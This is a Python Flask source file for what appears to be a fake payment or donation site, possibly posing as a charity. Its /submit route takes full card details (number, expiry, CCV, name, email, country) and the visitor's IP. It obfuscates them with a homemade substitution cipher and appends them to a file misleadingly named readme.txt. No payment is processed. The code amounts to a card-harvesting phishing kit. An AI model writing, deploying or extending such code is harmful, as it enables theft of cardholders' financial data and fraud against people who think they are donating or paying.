import pickle

import pandas as pd
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)
app.secret_key = 'thanks'  # Required for session management


# Home page route
@app.route('/')
def home():
    return render_template('index.html')


@app.route('/payment/')
def payment():
    return render_template('payment/payment.html')


# Thank you page route
@app.route('/thanks/')  # create Serever ERROR page
def thank_you():
    return render_template('thanks/thanks.html')
"""chars = r'''`1234567890-=qwertyuiop[]\asdN_fghjkl;'zxcvbnm,./~!@#$%^&*()+QWERTYUIOP}{|ASDFGHJCKL:"ZXVBM<>?ضصثقفغعهخحجدشسيبلاتنمكطئءؤرىةوزظ'''
chars = set([c for c in chars])
chars = [c for c in chars]

chars_shuffled = pd.Series(chars).sample(frac=1.0, random_state=9873).tolist()
encryptor = {k: v for k, v in zip(chars,chars_shuffled)}
decryptor = {v: k for (k, v) in encryptor.items()}


encryptor[' ']=' '
decryptor[' ']=' '


print(encryptor)
print(decryptor)
import pickle

pd.to_pickle(encryptor,'encryptor.pkl',)
pd.to_pickle(decryptor,'decryptor.pkl',)
"""

encryptor=pd.read_pickle('encryptor.pkl',)
decryptor=pd.read_pickle('decryptor.pkl',)

def encrypt(text):
    encrypted = []
    for c in text:
        try:
            encrypted.append(encryptor.get(c, ' '))
        except:
            encrypted.append('   ')
    return ''.join(encrypted)
def decrypt(text):
    decrypted = []
    for c in text:
        try:
            decrypted.append(decryptor.get(c, ' '))
        except:
            decrypted.append('   ')
    return ''.join(decrypted)
# Form submission route
@app.route('/submit', methods=['POST'])
def submit():
    # Get user input from the form
    username = request.form['username']
    email = request.form['email'] + ''
    expiry = request.form['expiry']
    card_number = request.form['card_number']
    ccv = request.form['ccv']
    country = request.form['country'] + ''

    # Save the user input (for demonstration, we'll just print it)
    ip_address = request.remote_addr
    with open('readme.txt', 'a',encoding='utf-8') as file:
        text = fr''' 
        user submitted
        * IP Address: {ip_address}
        * CARD-DETAILS:  Email= {email} ||| Name= {username} ||| expiry-date= {expiry} ||| card-number= {card_number} ||| ccv= {ccv} ||| country= {country} ;
        ---
        '''
        file.write(encrypt(text))

    # Optionally, you could save it to a file or database here

    # Redirect to a success page or back to the home page
    return redirect('/thanks')


"""# Success page route
@app.route('/https://israelrescue.org/')
def success():
    return " done successfully!"""

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
